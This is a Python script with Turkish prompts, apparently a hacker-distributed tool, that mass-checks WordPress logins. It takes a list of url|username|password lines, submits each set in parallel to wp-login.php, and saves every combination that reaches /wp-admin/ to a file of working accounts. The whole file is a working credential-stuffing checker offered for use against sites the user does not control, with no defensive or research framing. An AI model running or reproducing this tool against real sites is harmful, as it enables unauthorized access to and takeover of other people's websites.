#!/usr/bin/env python3
#*- coding: utf-8 -*--
#Coded by Morbius.os

AUTHOR = 'Morbius.os'
GİTHUB = 'https://github.com/morbius-os'
INSTAGRAM= '@morbius.os'

import os
import sys
import time 
try:
    import requests
except:
    os.system('pip install requests')

try:
    from multiprocessing import Pool
except:
    os.system('pip install Pool')

PURPLE = '\033[95m'
CYAN = '\033[96m'
DARKCYAN = '\033[36m'
BLUE = '\033[94m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
RED = '\033[91m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'
END = '\033[0m'

def animasyon(yazi):
     for u in yazi + '\n' :
         sys.stdout.write(u)
         sys.stdout.flush()
         time.sleep(10. / 100)
         
def hızlı_ani(yazi):
     for u in yazi + '\n' :
         sys.stdout.write(u)
         sys.stdout.flush()
         time.sleep(10. / 250)
         
def max_ani(yazi):
     for u in yazi + '\n' :
         sys.stdout.write(u)
         sys.stdout.flush()
         time.sleep(1. / 55550)

def banner():
    try:
        os.system('clear')
    except:
         os.system('cls')
    print("""{}
__        __            _ ____                                        
\ \      / /__  _ __ __| |  _ \ _ __ ___  ___ ___                                    
 \ \ /\ / / _ \| '__/ _` | |_) | '__/ _ \/ __/ __|                            
  \ V  V / (_) | | | (_| |  __/| | |  __/\__ \__ \                        
   \_/\_/ \___/|_|  \__,_|_|   |_|  \___||___/___/                        
{}
  ____ _               _               ____                                
 / ___| |__   ___  ___| | _____ _ __  | __ ) _   _                                
| |   | '_ \ / _ \/ __| |/ / _ \ '__| |  _ \| | | |                            
| |___| | | |  __/ (__|   <  __/ |    | |_) | |_| |                                    
 \____|_| |_|\___|\___|_|\_\___|_|    |____/ \__, |                            
                                             |___/                    
{} __  __            _     _                                                
|  \/  | ___  _ __| |__ (_)_   _ ___   ___  ___                                    
| |\/| |/ _ \| '__| '_ \| | | | / __| / _ \/ __|                            
| |  | | (_) | |  | |_) | | |_| \__ \| (_) \__ \                                    
|_|  |_|\___/|_|  |_.__/|_|\__,_|___(_)___/|___/                                    
{}
Author: {}
Instagram: {}
Github: {}
{}
""".format(BLUE,RED,YELLOW,END,AUTHOR,INSTAGRAM,GİTHUB,END))

banner()
print(RED+ "TOOLUN ÇALIŞMASI İÇİN SİTE LİSTESİNİN AŞAĞIDAKİ GİBİ OLMASI GEREKMEKTEDİR!!!"+ END)
print(BLUE + "https://example.com/wp-login.php|admin|password"+ END)


sitelerin_dosyası = input(f"Lütfen site listesi dosyasının yolunu girin: {GREEN}")
while not os.path.isfile(sitelerin_dosyası):
    print(f'\n{RED}Lütfen Doğru Bir Dosya Giriniz!!'+END)
    sitelerin_dosyası = input(f"Lütfen site listesi dosyasının yolunu girin: {GREEN}")


dosya_naame = input(f"{END}Girişin Başarılı Olduğu Sitelerin Kaydolacağı Belgeye Bir İsim Girin: {GREEN}")

while not os.path.isfile(sitelerin_dosyası):
    print(RED + "Hatalı dosya/dosya yolu, tekrar deneyin." + END)
    sitelerin_dosyası = input("Lütfen site listesi dosyasının yolunu tekrar girin: ")

def site_check(line):
    with open(dosya_naame, "a") as out:  
        try:
            url, username, password = line.strip().split("|")
        except ValueError:
            print(RED + f"{line.strip()} - Hatalı Format Atlandı" + END)
            return
        data = {"log": username, "pwd": password, "wp-submit": "Log In"}
        try:
            response = requests.post(url, data=data, timeout=5)
            if "/wp-admin/" in response.url:
                print(GREEN + f"{url} - Kullanıcı adı ve şifre doğru." + END)
                out.write(line) 
                return True
            else:
                print(RED + f"{url} - Kullanıcı adı veya şifre yanlış." + END)
                return False
        except requests.exceptions.Timeout:
            print(RED + f"{url} - Zaman aşımı." + END)
            return False
        except:
            print(RED + f"{url} - Bilinmeyen bir hata oluştu." + END)
            return False

if __name__ == "__main__":
    with open(sitelerin_dosyası) as f:
        pool = Pool(processes=os.cpu_count())
        results = pool.map(site_check, f)
    success_count = results.count(True)
    print(GREEN + f"{success_count} siteye başarılı giriş yapıldı, "+ END)